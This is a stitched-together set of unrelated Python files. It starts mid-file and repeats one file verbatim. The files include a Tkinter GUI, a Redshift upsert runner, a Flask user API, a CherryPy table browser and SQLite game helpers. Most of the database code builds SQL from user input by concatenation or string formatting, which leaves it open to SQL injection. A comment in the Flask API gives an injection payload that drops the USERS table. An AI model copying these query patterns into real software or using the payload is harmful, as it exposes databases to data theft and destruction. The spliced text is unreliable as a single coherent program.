				self.View_Result_Button.config(state='normal')                    


class ResultsPage(tk.Frame):

	def __init__(self, parent, controller):

		tk.Frame.__init__(self, parent)

		self.controller = controller

		(ID, UPC, name, imageURI) = controller.get_result()                    

		load = Image.open(imageURI)                    
		render = ImageTk.PhotoImage(load)                    
		
		img_label = tk.Label(self, image=render)
		img_label.image = render                    
		img_label.pack(side="right")                    

		name_label = tk.Label(self, text="Product: " + name, font=controller.titleFont)                    
		name_label.pack(pady=10, padx=10, anchor="nw")                    

		upc_label = tk.Label(self, text="UPC: " + UPC, font=controller.itemFont)                    
		upc_label.pack(pady=10, padx=10, anchor="nw")                    

		new_search_button = tk.Button(self, text="New Search",                    
			font=controller.itemFont, command=lambda: self.new_search())                    

		new_search_button.pack(side="left", pady=10, padx=10, anchor="sw")                    

		exit_app_button = tk.Button(self, text="Quit",                     
			font=controller.itemFont, command=lambda: sys.exit(0))

		exit_app_button.pack(side="left", pady=10, padx=10, anchor="sw")                    


	def new_search(self):                    

		self.controller.remove_frame(SearchPage)                    

		new_frame = self.controller.create_frame(SearchPage)                    

		#print("IN NEW SEARCH: " + str(type(new_frame)))

		#self.controller.show_frame(new_frame)

		# self.controller.frames.pop('SearchPage', None)

		# frame = SearchPage(self.controller.container, self.controller)

		# self.controller.frames[SearchPage] = frame

		# self.controller.show_frame(SearchPage)



app = RaspiTelxon()
app.geometry("800x480")
app.mainloop()

#!/usr/bin/env python

"""Runner for the upsert SQL step
"""

import argparse
import pandas.io.sql as pdsql
from dataduct.data_access import redshift_connection
from dataduct.database import SqlStatement
from dataduct.database import Table


def main():
    """Main Function
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('--table_definition', dest='table_definition',
                        required=True)
    parser.add_argument('--sql', dest='sql', required=True)
    parser.add_argument('--analyze', action='store_true', default=False)
    parser.add_argument('--non_transactional', action='store_true',
                        default=False)

    args, sql_arguments = parser.parse_known_args()
    print args, sql_arguments

    table = Table(SqlStatement(args.table_definition))
    connection = redshift_connection()
    # Enable autocommit for non transactional sql execution
    if args.non_transactional:
        connection.autocommit = True

    table_not_exists = pdsql.read_sql(table.check_not_exists_script().sql(),
                                      connection).loc[0][0]

    cursor = connection.cursor()
    # Create table in redshift, this is safe due to the if exists condition
    if table_not_exists:
        cursor.execute(table.create_script().sql())

    # Load data into redshift with upsert query
    sql = args.sql % tuple(sql_arguments)                    
    print 'Running :', sql                    
    cursor.execute(sql)                    
    cursor.execute('COMMIT')

    # Analyze the table
    if args.analyze:
        cursor.execute(table.analyze_script().sql())

    cursor.close()
    connection.close()


if __name__ == '__main__':
    main()

#!/usr/bin/env python

"""Runner for the upsert SQL step
"""

import argparse
import pandas.io.sql as pdsql
from dataduct.data_access import redshift_connection
from dataduct.database import SqlStatement
from dataduct.database import Table


def main():
    """Main Function
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('--table_definition', dest='table_definition',
                        required=True)
    parser.add_argument('--sql', dest='sql', required=True)
    parser.add_argument('--analyze', action='store_true', default=False)
    parser.add_argument('--non_transactional', action='store_true',
                        default=False)

    args, sql_arguments = parser.parse_known_args()
    print args, sql_arguments

    table = Table(SqlStatement(args.table_definition))
    connection = redshift_connection()
    # Enable autocommit for non transactional sql execution
    if args.non_transactional:
        connection.autocommit = True

    table_not_exists = pdsql.read_sql(table.check_not_exists_script().sql(),
                                      connection).loc[0][0]

    cursor = connection.cursor()
    # Create table in redshift, this is safe due to the if exists condition
    if table_not_exists:
        cursor.execute(table.create_script().sql())

    # Load data into redshift with upsert query
    sql = args.sql % tuple(sql_arguments)                    
    print 'Running :', sql                    
    cursor.execute(sql)                    
    cursor.execute('COMMIT')

    # Analyze the table
    if args.analyze:
        cursor.execute(table.analyze_script().sql())

    cursor.close()
    connection.close()


if __name__ == '__main__':
    main()

from flask import Flask, request
from flask_restful import Resource, Api
from sqlalchemy import create_engine
from json import dumps
from flask_jsonpify import jsonify
import sqlite3
import jwt

app = Flask(__name__)
api = Api(app)

class Users(Resource):
    def get(self):
        query = conn.execute("SELECT * FROM USERS") # This line performs query and returns json result
        i=0
        for row in query:
            i = i+1
        return {'Number of users': i} # Fetches first column that is Employee ID

    #sql injection : { "Name": "antoine", "Password": "test+\"'); DROP TABLE USERS;"}
    # plus change execute to execute scritpt
    def post(self):
        print(request.json)
        Name = request.json['Name']
        Password = request.json['Password']
        query = conn.execute("INSERT INTO USERS(NAME, PASSWORD) VALUES ('"+Name+"', '"+Password+"')");                    
        conn.commit()
        return {'status': 'success'}

class User(Resource):
    def post(self):
        # print(request.json)
        name = request.form['Name']
        password = request.form['Password']
        query = conn.execute("SELECT PASSWORD FROM USERS WHERE NAME = '"+name+"'");
        realPassword = ""
        for row in query:
            realPassword= row[0]
            print(realPassword)
            break
        if realPassword is "":
            return 'user does not exist', 403
        if realPassword != password:
            return 'Wrong password', 403

        encoded = jwt.encode({'name': ''+name+''}, 'scalable', algorithm='HS256')
        encoded = encoded.decode('UTF-8')
        return {'token': ''+encoded+''}

api.add_resource(Users, '/users')
api.add_resource(User, '/user')

if __name__ == '__main__':
    conn = sqlite3.connect('user.db')
    app.run(port=5002)



import cherrypy
from jinja2 import Environment, FileSystemLoader
import os
import json
import csv
import time
from cherrypy.lib import file_generator
import StringIO
import random
import datetime

import datadb
from urlparams import UrlParams

env = Environment(loader=FileSystemLoader(os.path.join(os.path.dirname(__file__), 'templates')))


def fill_timeline_holes(data, bucket, db_uniq):
    """ fills gaps with zeroes between min and max with help of database
    data: [(datetime, count),...], bucket: [min|hour|day|week|month]
      TODO can be actually added to the initial select
    """

    if len(data) <= 1:
        return data

    data_as_dict = {}
    for d in data:
        data_as_dict[d[0]] = d
    ret_data = []
    sql = "select generate_series(%s, %s, '1{}'::interval)".format(bucket)
    time_series, col_names, error = datadb.execute_on_db_uniq(db_uniq, sql, (data[0][0], data[-1][0]))
    if error:
        raise Exception(error)
    for s in time_series:
        ret_data.append(data_as_dict.get(s[0], (s[0], 0L)))
    return ret_data


class Frontend(object):

    def __init__(self, features):
        self.features = features

    @cherrypy.expose
    def normalizeurl(self, *args):
        if len(args) < 2:
            raise Exception('Needs a table already')
        print 'normalized_url args', args
        urlparams = UrlParams(datadb.object_cache, self.features, *args)
        print 'normalized_url', urlparams.get_normalized_url()
        return urlparams.get_normalized_url()

    @cherrypy.expose
    def default(self, *args):
        if len(args) == 0:  # show all dbs
            return self.list_all_dbs()
        elif len(args) == 1:  # show all tables for a db
            return self.list_all_tables(args[0])

        message = ''
        print 'args', args
        urlparams = UrlParams(datadb.object_cache, self.features, *args)
        print 'up', urlparams
        sql = urlparams.to_sql()
        print 'sql', sql

        data, column_names, error = datadb.execute_on_db_uniq(urlparams.db_uniq, sql)                    
        if error:
            raise Exception('Error executing the query: ' + error)
        # print 'data', data
        column_info = datadb.get_column_info(urlparams.db_uniq, urlparams.table, column_names)  # TODO highlight PK in UI

        if urlparams.output_format == 'json':
            # stringify everything, not to get "is not JSON serializable"
            stringified = []
            for row in data:
                stringified.append([str(x) for x in row])   # TODO better to cast all cols to ::text in SQL?
            return json.dumps(stringified)
        elif urlparams.output_format in ['graph', 'png']:
            return self.plot_graph(data, urlparams)
        elif urlparams.output_format == 'csv':
            return self.to_csv(data, column_names, urlparams)
        else:
            tmpl = env.get_template('index.html')
            return tmpl.render(message=message, dbname=urlparams.dbname, table=urlparams.table, sql=sql, data=data,
                               column_info=column_info, max_text_length=self.features['maximum_text_column_length'])

    def list_all_dbs(self, output_format='html'):
        db_uniqs = datadb.object_cache.cache.keys()
        db_info = []
        for u in db_uniqs:
            splits = u.split(':')
            db_info.append({'hostname': splits[0], 'port': splits[1], 'dbname': splits[2]})
        db_info.sort(key=lambda x:x['dbname'])

        if output_format == 'json':
            return json.dumps(db_info)
        else:
            tmpl = env.get_template('dbs.html')
            return tmpl.render(message='', db_info=db_info)

    def list_all_tables(self, dbname, output_format='html'):
        db_uniq, table = datadb.object_cache.get_dbuniq_and_table_full_name(dbname)
        if not db_uniq:
            raise Exception('Database {} not found! Available DBs: {}'.format(dbname, datadb.object_cache.cache.keys()))
        hostname, port, db = tuple(db_uniq.split(':'))
        tables = datadb.object_cache.get_all_tables_for_dbuniq(db_uniq)
        tables.sort()
        # print 'tables', tables

        if output_format == 'json':
            return json.dumps(tables)
        else:
            tmpl = env.get_template('tables.html')
            return tmpl.render(message='', dbname=db, hostname=hostname, port=port, tables=tables)

    def plot_graph(self, data, urlparams):
        line_data = []
        pie_data = []

        limit = int(urlparams.limit)
        if urlparams.graphtype == 'pie' and len(data) > limit and limit > 1:    # formulate an artificial 'other' group with values > 'limit'
            sum = 0L
            for k, v in data[limit-1:]:
                sum += v
            data[limit-1:] = [('Other', sum)]

        if urlparams.output_format == 'graph':
            if urlparams.graphtype == 'line':
                line_data = fill_timeline_holes(data, urlparams.graphbucket, urlparams.db_uniq)
                line_data = [(int(time.mktime(p[0].timetuple()) * 1000), p[1]) for p in line_data]
                line_data = json.dumps(line_data)
            elif urlparams.graphtype == 'pie':
                for d in data:
                    pie_data.append({'label': str(d[0]), 'data': [d[1]]})
                pie_data = json.dumps(pie_data)

            tmpl = env.get_template('graph.html')
            return tmpl.render(line_data=line_data, pie_data=pie_data, graph_type=urlparams.graphtype, table=urlparams.table)
        elif urlparams.output_format == 'png':
            chart = None
            if urlparams.graphtype == 'line':
                line_data = fill_timeline_holes(data, urlparams.graphbucket, urlparams.db_uniq)
                import pygal
                chart = pygal.Line(width=1000)
                chart.title = 'Counts of {} over 1{} slots'.format(urlparams.graphkey, urlparams.graphbucket)
                labels = []
                mod_constant = 10 if len(line_data) < 100 else (30 if len(line_data) < 1000 else 1000)
                for i, d in enumerate(line_data):
                    if i == 0 or i == len(line_data)-1:
                        labels.append(d[0].strftime('%m-%d %H:%M'))
                        continue
                    if i % mod_constant == 0:
                        labels.append(d[0].strftime('%m-%d %H:%M'))
                chart.x_labels = labels
                chart.add('Count', [v for t, v in line_data])
            elif urlparams.graphtype == 'pie':
                import pygal
                chart = pygal.Pie()
                chart.title = 'Distribution of {} values'.format(urlparams.graphkey)
                for key, count in data:
                    chart.add(str(key), count)

            random_file_path = '/tmp/pgzebra{}.png'.format(random.random())
            chart.render_to_png(random_file_path)
            output = StringIO.StringIO(open(random_file_path).read())   # should be possible to skip this step also?
            os.unlink(random_file_path)

            cherrypy.response.headers['Content-Type'] = 'image/png'
            return file_generator(output)

    def to_csv(self, data, column_names, urlparams):
        csvfile = StringIO.StringIO()
        writer = csv.writer(csvfile, delimiter=';', quotechar='"', quoting=csv.QUOTE_ALL)
        writer.writerow(column_names)
        writer.writerows(data)
        cherrypy.response.headers['Content-Type'] = 'text/csv'
        cherrypy.response.headers['Content-Disposition'] = 'attachment; filename="{}_{}.csv"'.format(urlparams.table,
                                                                                                     datetime.datetime.now().strftime('%Y-%m-%d_%H%M'))
        return csvfile.getvalue()

from dbobject_cache import DBObjectsCache


class UrlParams(object):

    def __init__(self, object_cache, features, *args):
        """ :type object_cache : dbobject_cache.DBObjectsCache """
        self.object_cache = object_cache
        self.features = features
        self.db_uniq = None
        self.dbname = None
        self.table = None
        self.column_names = []
        self.filters = []     # [(col_short, op, value),]  op: eq/=, gt/>
        self.aggregations = []     # [(operator, column),]  op: count, sum, min, max
        self.joinitems = {}
        self.graphtype = None
        self.graphkey = None
        self.graphbucket = None
        self.limit = features.get('default_limit', 20)
        self.order_by_direction = features.get('default_order_by', 'DESC')
        self.order_by_columns = []
        self.output_format = features.get('default_format', 'html')

        # return args
        args_count = len(args)
        if args_count < 2:
            raise Exception('Invalid arguments!')   # TODO add more checks, lose 500. separate exception subclass?

        self.db_uniq, self.table = object_cache.get_dbuniq_and_table_full_name(args[0], args[1])
        if not (self.db_uniq and self.table):
            raise Exception('DB or Table not found!')   # TODO suggest similar tables if only table
        self.column_names = [x['column_name'] for x in object_cache.cache[self.db_uniq][self.table]]
        self.dbname = self.db_uniq.split(':')[2]

        current_arg_counter = 2
        while current_arg_counter < args_count:
            current_arg = args[current_arg_counter]
            next_arg = None
            next_2nd = None
            has_next = args_count > current_arg_counter + 1
            if has_next: next_arg = args[current_arg_counter + 1]
            has_2nd = args_count > current_arg_counter + 2
            if has_2nd: next_2nd = args[current_arg_counter + 2]

            # output_format
            if current_arg == 'f' or current_arg == 'format':
                if has_next and next_arg in ['c', 'csv', 'j', 'json', 'h', 'html', 'g', 'graph', 'png']:
                    if next_arg[0] == 'c':
                        self.output_format = 'csv'
                    elif next_arg[0] == 'j':
                        self.output_format = 'json'
                    elif next_arg[0] == 'g' and has_2nd and next_2nd in ['l', 'line', 'p', 'pie']:
                        self.output_format = 'graph'
                        self.graphtype = 'pie' if next_2nd[0] == 'p' else 'line'
                        current_arg_counter += 3
                        continue
                    elif next_arg == 'png' and has_2nd and next_2nd in ['l', 'line', 'p', 'pie']:
                        self.output_format = 'png'
                        self.graphtype = 'pie' if next_2nd[0] == 'p' else 'line'
                        current_arg_counter += 3
                        continue
                    else:
                        self.output_format = 'html'
                    current_arg_counter += 2
                    continue

            # limit
            if current_arg == 'l' or current_arg == 'limit':
                if has_next and str(next_arg).isdigit():
                    self.limit = next_arg
                    current_arg_counter += 2
                    continue

            # order by
            #   : o[rderby]
            #   : o/[asc|desc]
            #   : o/[c|m]
            #   : o/[c|m][asc|desc]
            #   : o[rderby]/columnpattern[,pattern2]/[asc|desc]
            # TODO multicolumn, comma separated
            if current_arg == 'o' or current_arg == 'orderby':
                if has_2nd and next_2nd in ['a', 'asc', 'd', 'desc']:
                    if next_arg in ['c', 'created']:
                        self.order_by_columns = [self.object_cache.get_column_single(self.db_uniq, self.table, self.features['created_patterns'])]
                    elif next_arg in ['m', 'modified']:
                        self.order_by_columns = [self.object_cache.get_column_single(self.db_uniq, self.table, self.features['modified_patterns'])]
                    else:
                        self.order_by_columns = self.object_cache.get_column_multi(self.db_uniq, self.table, next_arg)
                    if not self.order_by_columns:
                        raise Exception('Order By column {} not found! Known columns: {}'.format(next_arg, self.column_names))
                    if next_2nd in ['a', 'asc']:
                        self.order_by_direction = 'ASC' if next_2nd[0] == 'a' else 'DESC'
                    current_arg_counter += 3
                    continue
                elif has_next and next_arg in ['a', 'asc', 'd', 'desc']:
                    self.order_by_columns = [self.column_names[0]]  # 1st col by default TODO use PK
                    self.order_by_direction = 'ASC' if next_arg[0] == 'a' else 'DESC'
                    current_arg_counter += 2
                    continue
                elif has_next and next_arg in ['c', 'created','m', 'modified'] and (not has_2nd or next_2nd not in ['a','asc','d','desc']):
                        if next_arg[0] == 'c':
                            self.order_by_columns = [self.object_cache.get_column_single(self.db_uniq, self.table, self.features['created_patterns'])]
                        else:
                            self.order_by_columns = [self.object_cache.get_column_single(self.db_uniq, self.table, self.features['modified_patterns'])]
                        current_arg_counter += 2
                        continue
                elif has_next and object_cache.get_column_multi(self.db_uniq, self.table, next_arg):    # /o/col1,col2
                    columns = object_cache.get_column_multi(self.db_uniq, self.table, next_arg)
                    if columns:
                        self.order_by_columns = columns
                        current_arg_counter += 2
                        continue
                else:
                    self.order_by_columns = [self.column_names[0]]  # 1st col by default TODO use PK
                    current_arg_counter += 1
                    continue

            # filters
            # /column/>/val
            # TODO add special keywords like today?

            if has_next and has_2nd:
                if next_arg.upper() in ['<', '<=', '>', '>=', '=', 'EQ', 'LT', 'LTE', 'GT', 'GTE',
                                        'IS', 'IS NOT', 'ISNOT', 'IN']:                    
                    next_arg = next_arg.upper()
                    column = self.object_cache.get_column_single(self.db_uniq, self.table, current_arg)
                    if not column:
                        raise Exception('Column {} not found!'.format(current_arg))
                    if next_arg in ['IS', 'IS NOT', 'ISNOT']:
                        if next_2nd.upper() != 'NULL':
                            raise Exception('is/isnot requires NULL as next parameter!')
                        next_2nd = next_2nd.upper()                    
                    print next_arg                    
                    next_arg = next_arg.replace('ISNOT', 'IS NOT')
                    next_arg = next_arg.replace('EQ', '=')
                    next_arg = next_arg.replace('LTE', '<=')
                    next_arg = next_arg.replace('LT', '<')
                    next_arg = next_arg.replace('GTE', '>=')
                    next_arg = next_arg.replace('GT', '>')
                    print next_arg                    
                    if next_arg == 'IN':                    
                        self.filters.append((column, next_arg, '(' + next_2nd + ')'))                    
                    else:
                        self.filters.append((column, next_arg, next_2nd))                    
                    current_arg_counter += 3
                    continue

            # simple aggregations
            # count, sum, min, max
            if current_arg == 'agg' and has_2nd and next_arg in ['count', 'sum', 'min', 'max']:
                agg_col = self.object_cache.get_column_single(self.db_uniq, self.table, next_2nd)
                self.aggregations.append((next_arg, agg_col))
                current_arg_counter += 3
                continue

            # simple graphs
            # /gkey/col
            if current_arg in ['gk', 'gkey'] and has_next:
                self.graphkey = self.object_cache.get_column_single(self.db_uniq, self.table, next_arg)
                current_arg_counter += 2
                continue
            # /gbucket/1h   [1month,1d,1h,1min]
            if current_arg in ['gb', 'gbucket'] and has_next and next_arg in ['month', 'day', 'hour', 'min', 'minute']:
                self.graphbucket = next_arg
                current_arg_counter += 2
                continue


            print 'WARNING: did not make use of ', current_arg
            current_arg_counter += 1

    def do_pre_sql_check(self): # TODO sql injection analyze. use psycopg2 mogrify?
        if self.graphtype == 'line' and not self.graphbucket:
            raise Exception('gbucket/gb parameter missing! [ allowed values: month, week, day, hour, minute]')

    def to_sql(self):
        self.do_pre_sql_check()
        sql = 'SELECT '
        if self.aggregations:
            i = 0
            for agg_op, column in self.aggregations:
                sql += ('' if i == 0 else ', ') + agg_op + '(' + column + ')'
                i += 1
        elif self.output_format in ['graph', 'png']:
            if self.graphtype == 'line':
                sql += "date_trunc('{}', {}), count(*)".format(self.graphbucket, self.graphkey)
            else:
                sql += "{}, count(*)".format(self.graphkey)
        else:
            sql += ', '.join(self.column_names)

        sql += ' FROM ' + self.table
        if self.filters:
            sql += ' WHERE '
            i = 0
            for fcol, fop, fval in self.filters:
                col_full_name = self.object_cache.get_column_single(self.db_uniq, self.table, fcol)
                if not col_full_name:
                    raise Exception('Column {} not found! Known columns: {}'.format(fcol, self.column_names))
                sql += '{}{} {} {}'.format((' AND ' if i > 0 else ''), col_full_name, fop.upper(), fval)                    
                i += 1

        if self.graphkey:
            if self.graphtype == 'line':
                sql += ' GROUP BY 1 ORDER BY 1'
            elif self.graphtype == 'pie':
                sql += ' GROUP BY 1 ORDER BY 2 DESC'    # LIMIT {}'.format(self.limit)
        elif not self.aggregations:
            if self.order_by_columns:
                if isinstance(self.order_by_columns, list):
                    sql += ' ORDER BY '
                    order_bys = []
                    for col in self.order_by_columns:
                        order_bys.append('{} {}'.format(col, self.order_by_direction.upper()))                    
                    sql += ', '.join(order_bys)
                else:
                    sql += ' ORDER BY {} {}'.format(self.order_by_columns, self.order_by_direction.upper())                    
            sql += ' LIMIT {}'.format(self.limit)
        return sql                    

    def get_normalized_url(self):
        url = '/' + '/'.join([self.dbname, self.table, 'output', self.output_format])
        if self.output_format in ['graph', 'png']:
            url += '/' + self.graphtype
            if self.graphkey:
                url += '/{}/{}'.format('graphkey', self.graphkey)
            if self.graphbucket:
                url += '/{}/{}'.format('gbucket', self.graphbucket)
        for column, op, value in self.filters:
            url += '/{}/{}/{}'.format(column, op, value)
        if self.output_format not in ['graph', 'png']:
            if self.order_by_columns:
                url += ('/{}/{}/{}'.format('orderby', ','.join(self.order_by_columns), self.order_by_direction)).lower()
            elif self.order_by_direction:
                url += ('/{}/{}'.format('orderby', self.order_by_direction)).lower()
        url += '/{}/{}'.format('limit', self.limit)
        return url

    def __str__(self):
        return 'UrlParams: db = {}, table = {}, columns = {}, filters = {}, order_by_columns = {},' \
            ' output_format = {}, graphtype = {}, gkey = {}, gbucket = {}, limit = {}'.format(self.db_uniq, self.table,
                                                                                 self.column_names, self.filters,
                                                                                 self.order_by_columns, self.output_format,
                                                                                 self.graphtype, self.graphkey,
                                                                                 self.graphbucket, self.limit)


if __name__ == '__main__':
    db_objects_cache = DBObjectsCache()
    db_objects_cache.add_table_to_cache('local', 5432, 'postgres',
                                        'public.table1',
                                        DBObjectsCache.formulate_table(['col1', 'col2', 't_created']))
    print db_objects_cache

    features = {
        'default_order_by': 'DESC',
        'default_limit': '20',
        'created_patterns': 'created,timestamp,time',
        'modified_patterns': 'modified,updated,timestamp',
    }
    # up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'l', '100', 'o', 'd')
    # up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'o', 'm', 'f', 'h', 'col1', '<=', '1')
    # up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'col1', '<=', '100', 'agg', 'count', 'c1', 'agg', 'max', 'c1')
    # up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'f', 'g', 'l', 'gkey', 'created', 'gbucket', 'hour')
    up = UrlParams(db_objects_cache, features, 'pos', 'ta*1', 'f', 'g', 'pie', 'gkey', 'l1')
    print up
    print up.get_normalized_url()
    print up.to_sql()

#!/usr/bin/env python

import sqlite3, os

script_dir = os.path.dirname(__file__)
rel_path = "database/main.db"
database = sqlite3.connect(os.path.join(script_dir, rel_path), timeout=1)
database.row_factory = sqlite3.Row
db  = database.cursor()

def getPlayer(player):
	db.execute("SELECT * FROM players WHERE Name = '%s' COLLATE NOCASE" % player)                    
	playerstats = dict(db.fetchone())
	return playerstats

def ratingChange(Name, ELO, Played, W, L):
	db.execute("UPDATE players SET ELO = %i, Played = %i, W = %i, L = %i WHERE Name = '%s' COLLATE NOCASE" % (ELO, Played, W, L, Name))                    
	database.commit()

def vouchPlayer(vouched):
	db.execute("SELECT MAX(ID) as max_id from players")
	player = db.fetchone()
	ID = player[0]
	NewID = ID + 1
	db.execute("INSERT INTO players VALUES (?, ?, 0, 1500, 0, 0, 0)", (NewID, vouched))
	database.commit()

def makeJudge(judge):
	db.execute("UPDATE players SET Judge = 1 WHERE Name = '%s' COLLATE NOCASE" % (judge))                     
	database.commit()

def getRunning():
	db.execute("SELECT * FROM games WHERE Running = 'Yes'")
	running = db.fetchall()
	return running

def GameNewPlayed(Played, ID):
	db.execute("UPDATE games set GamesPlayed = %i WHERE ID = %i" % (Played, ID))                    
	database.commit()

def closeGame(ID):
	db.execute("UPDATE games set Running = 'No' WHERE ID = %i" % ID)                    
	database.commit()

def getGameID(ID):
	db.execute("SELECT * FROM games WHERE ID = %i" % ID)                    
	ID = db.fetchone()
	return ID

def getGameNewID():
	db.execute("SELECT MAX(ID) AS max_id FROM games")
	game = db.fetchone()
	NewID = int(game[0]) + 1
	return NewID

def CreateGame(Pod):
	db.execute("INSERT INTO games VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", Pod)
	database.commit()

if __name__ == '__main__':
    getRunning()

import sqlite3
import os
import sys


#The goal is to create three entries on the table: The name of the person (hashed), the address of the person (also hashed), and a bool value that checks if they're registered or not.
#For the hash, a cryptographic hash would be optimal.

def create_table(table_name, arg_count, arg_values):
    '''Takes a table name, a number of arguments count, and argument values.
    Argument values are used for the individual table columns.'''
    con = sqlite3.connect("something.db")                    
    con.isolation_level = None                    
    cur = con.cursor()                    
    buffer = ""                    
    #Create the table.
    arg_string = " ("
    for i in range (0, arg_count):
        #We have to process it as a string first.
        if(i != arg_count):                    
            #If it is not the last argument in the string, insert a comma.
            arg_string += (arg_values[i] + ", ")
        elif(i == arg_count):                    
            #If it is the last argument in the string, insert a closing parentheses and semicolon.
            arg_string += (arg_values[i] + ");")                    
    cur.execute("CREATE TABLE " + table_name + arg_string)
    #Now that we made the table and added the columns, we have to have functions to do other things like insert values.

# -*- encoding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution	
#    Copyright (C) 2004-2009 Tiny SPRL (<http://tiny.be>). All Rights Reserved
#    $Id$
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from lxml import etree
from mx import DateTime
from mx.DateTime import now
import time
from tools.translate import _

from osv import fields, osv
from tools.translate import _

class project(osv.osv):
    _name = "project.project"
    _description = "Project"

    def _complete_name(self, cr, uid, ids, name, args, context):
        res = {}
        for m in self.browse(cr, uid, ids, context=context):
            res[m.id] = (m.parent_id and (m.parent_id.name + '/') or '') + m.name
        return res


    def check_recursion(self, cursor, user, ids, parent=None):
        return super(project, self).check_recursion(cursor, user, ids,
                parent=parent)

    def onchange_partner_id(self, cr, uid, ids, part):
        if not part:
            return {'value':{'contact_id': False, 'pricelist_id': False}}
        addr = self.pool.get('res.partner').address_get(cr, uid, [part], ['contact'])

        pricelist = self.pool.get('res.partner').browse(cr, uid, part).property_product_pricelist.id
        return {'value':{'contact_id': addr['contact'], 'pricelist_id': pricelist}}

    def _progress_rate(self, cr, uid, ids, names, arg, context=None):
        res = {}.fromkeys(ids, 0.0)
        progress = {}
        if not ids:
            return res
        ids2 = self.search(cr, uid, [('parent_id','child_of',ids)])
        if ids2:
            cr.execute('''SELECT
                    project_id, sum(planned_hours), sum(total_hours), sum(effective_hours)
                FROM
                    project_task 
                WHERE
                    project_id in %s AND
                    state<>'cancelled'
                GROUP BY
                    project_id''',
                       (tuple(ids2),))
            progress = dict(map(lambda x: (x[0], (x[1],x[2],x[3])), cr.fetchall()))
        for project in self.browse(cr, uid, ids, context=context):
            s = [0.0,0.0,0.0]
            tocompute = [project]
            while tocompute:
                p = tocompute.pop()
                tocompute += p.child_id
                for i in range(3):
                    s[i] += progress.get(p.id, (0.0,0.0,0.0))[i]
            res[project.id] = {
                'planned_hours': s[0],
                'effective_hours': s[2],
                'total_hours': s[1],
                'progress_rate': s[1] and (100.0 * s[2] / s[1]) or 0.0
            }
        return res

    def unlink(self, cr, uid, ids, *args, **kwargs):
        for proj in self.browse(cr, uid, ids):
            if proj.tasks:
                raise osv.except_osv(_('Operation Not Permitted !'), _('You can not delete a project with tasks. I suggest you to deactivate it.'))
        return super(project, self).unlink(cr, uid, ids, *args, **kwargs)
    _columns = {
        'name': fields.char("Project Name", size=128, required=True),
        'complete_name': fields.function(_complete_name, method=True, string="Project Name", type='char', size=128),
        'active': fields.boolean('Active'),
        'category_id': fields.many2one('account.analytic.account','Analytic Account', help="Link this project to an analytic account if you need financial management on projects. It enables you to connect projects with budgets, planning, cost and revenue analysis, timesheets on projects, etc."),
        'priority': fields.integer('Sequence'),
        'manager': fields.many2one('res.users', 'Project Manager'),
        'warn_manager': fields.boolean('Warn Manager', help="If you check this field, the project manager will receive a request each time a task is completed by his team."),
        'members': fields.many2many('res.users', 'project_user_rel', 'project_id', 'uid', 'Project Members', help="Project's member. Not used in any computation, just for information purpose."),
        'tasks': fields.one2many('project.task', 'project_id', "Project tasks"),
        'parent_id': fields.many2one('project.project', 'Parent Project',\
            help="If you have [?] in the name, it means there are no analytic account linked to project."),
        'child_id': fields.one2many('project.project', 'parent_id', 'Subproject'),
        'planned_hours': fields.function(_progress_rate, multi="progress", method=True, string='Planned Time', help="Sum of planned hours of all tasks related to this project."),
        'effective_hours': fields.function(_progress_rate, multi="progress", method=True, string='Time Spent', help="Sum of spent hours of all tasks related to this project."),
        'total_hours': fields.function(_progress_rate, multi="progress", method=True, string='Total Time', help="Sum of total hours of all tasks related to this project."),
        'progress_rate': fields.function(_progress_rate, multi="progress", method=True, string='Progress', type='float', help="Percent of tasks closed according to the total of tasks todo."),
        'date_start': fields.date('Starting Date'),
        'date_end': fields.date('Expected End'),
        'partner_id': fields.many2one('res.partner', 'Partner'),
        'contact_id': fields.many2one('res.partner.address', 'Contact'),
        'warn_customer': fields.boolean('Warn Partner', help="If you check this, the user will have a popup when closing a task that propose a message to send by email to the customer."),
        'warn_header': fields.text('Mail Header', help="Header added at the beginning of the email for the warning message sent to the customer when a task is closed."),
        'warn_footer': fields.text('Mail Footer', help="Footer added at the beginning of the email for the warning message sent to the customer when a task is closed."),
        'notes': fields.text('Notes', help="Internal description of the project."),
        'timesheet_id': fields.many2one('hr.timesheet.group', 'Working Time', help="Timetable working hours to adjust the gantt diagram report"),
        'state': fields.selection([('template', 'Template'), ('open', 'Running'), ('pending', 'Pending'), ('cancelled', 'Cancelled'), ('done', 'Done')], 'State', required=True, readonly=True),
     }

    _defaults = {
        'active': lambda *a: True,
        'manager': lambda object,cr,uid,context: uid,
        'priority': lambda *a: 1,
        'date_start': lambda *a: time.strftime('%Y-%m-%d'),
        'state': lambda *a: 'open'
    }

    _order = "parent_id,priority,name"
    _constraints = [
        (check_recursion, 'Error ! You can not create recursive projects.', ['parent_id'])
    ]

    # toggle activity of projects, their sub projects and their tasks
    def set_template(self, cr, uid, ids, context={}):
        res = self.setActive(cr, uid, ids, value=False, context=context) 
        return res

    def set_done(self, cr, uid, ids, context={}):
        self.write(cr, uid, ids, {'state':'done'}, context=context)
        return True

    def set_cancel(self, cr, uid, ids, context={}):
        self.write(cr, uid, ids, {'state':'cancelled'}, context=context)
        return True

    def set_pending(self, cr, uid, ids, context={}):
        self.write(cr, uid, ids, {'state':'pending'}, context=context)
        return True

    def set_open(self, cr, uid, ids, context={}):
        self.write(cr, uid, ids, {'state':'open'}, context=context)
        return True

    def reset_project(self, cr, uid, ids, context={}):
        res = self.setActive(cr, uid, ids,value=True, context=context)
        return res

    def copy(self, cr, uid, id, default={},context={}):
        proj = self.browse(cr, uid, id, context=context)
        default = default or {}
        context['active_test'] = False
        default['state'] = 'open'
        if not default.get('name', False):
            default['name'] = proj.name+_(' (copy)')
        res = super(project, self).copy(cr, uid, id, default, context)
